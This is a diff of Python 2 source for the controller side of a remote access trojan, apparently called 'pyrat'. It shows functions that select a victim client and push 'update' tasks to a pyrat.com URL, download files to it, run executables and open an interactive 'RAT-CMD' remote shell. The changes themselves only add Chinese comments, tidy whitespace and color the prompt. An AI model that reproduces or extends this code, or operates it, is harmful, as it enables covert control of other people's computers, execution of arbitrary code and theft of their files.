@@ -11,7 +11,7 @@ from colorama import init, Fore, Back, Style
 
 class SvrMethod():
     tsk = None
-    #@staticmethod 
+    #@staticmethod
     @classmethod
     def set_taskmgr(cls, taskmgr):
         SvrMethod.tsk = taskmgr
@@ -35,6 +35,16 @@ class SvrMethod():
         return task
 
     def resp_task(self, id, task_id, task, argv, ret, data):
+        """
+        接受到客户端返回的信息内容
+        :param id:
+        :param task_id:
+        :param task:
+        :param argv:
+        :param ret:
+        :param data:
+        :return:
+        """
         print '%s do %s(%d) %s %s' % (id, task, task_id, argv, str(ret))
         if task != 'upload':
             print data
@@ -88,7 +98,7 @@ class SvrTask(threading.Thread):
         self.cmd_dir = None
         self.pre_cmd_tip = 'cmd >'
         self.upload_path = ''
-    
+
     def getdb(self):
         return self.db
 
@@ -114,6 +124,7 @@ class SvrTask(threading.Thread):
                     continue
                 cmd = tmp[0]
 
+            # 接受到用户要传的指令
             method = self.cmdmap.get(cmd)
             if method:
                 method()
@@ -135,7 +146,7 @@ class SvrTask(threading.Thread):
         print '(q)uit:     quit server'
 
     def new_cmd(self):
-        #print self.pre_cmd_tip, 
+        #print self.pre_cmd_tip,
         sys.stdout.write('\r')
         sys.stdout.write(self.pre_cmd_tip)
         sys.stdout.flush()
@@ -206,18 +217,18 @@ class SvrTask(threading.Thread):
     def get_target(self):
         print self.cur_cid
         self.check_client()
-    
+
     def sel_client(self):
         id = raw_input('client_id:')
         if not id:
-            print 'Invalid client_id NULL' 
+            print 'Invalid client_id NULL'
         elif not self.db.get_client(id):
             print 'Invalid client_id', id
         else:
             self.cur_cid = id
             print 'Set target client:', id
             self.check_client()
-    
+
     def has_client(self):
         if not self.cur_cid:
             print 'Please first set target client by (s)elect command.'
@@ -255,7 +266,7 @@ class SvrTask(threading.Thread):
     def update(self):
         if self.has_client():
             self.db.add_task(self.cur_cid, 'update', 'http://pyrat.com/?v=1.3')
-    
+
     def update_done(self, data):
         while True:
             path = self.upload_path
@@ -295,7 +306,7 @@ class SvrTask(threading.Thread):
             path = raw_input("dest path:")
             argv = dtype + ' ' + url + ' ' + path
             self.db.add_task(self.cur_cid, 'download', argv)
-    
+
     def runexec(self):
         if self.has_client():
             path = raw_input('run target:')
@@ -341,8 +352,9 @@ class SvrTask(threading.Thread):
     def cmdshell(self):
         if self.has_client():
             while True:
-                self.pre_cmd_tip = 'RAT-CMD > '
-                cmd = raw_input('RAT-CMD > ').strip()
+                self.pre_cmd_tip = Fore.GREEN + 'RAT-CMD > '
+                cmd = raw_input(Fore.GREEN +'RAT-CMD > ').strip()
+                # 检查是不是有这个客户端 没退
                 if not self.check_client():
                     self.cur_cid = None
                     return
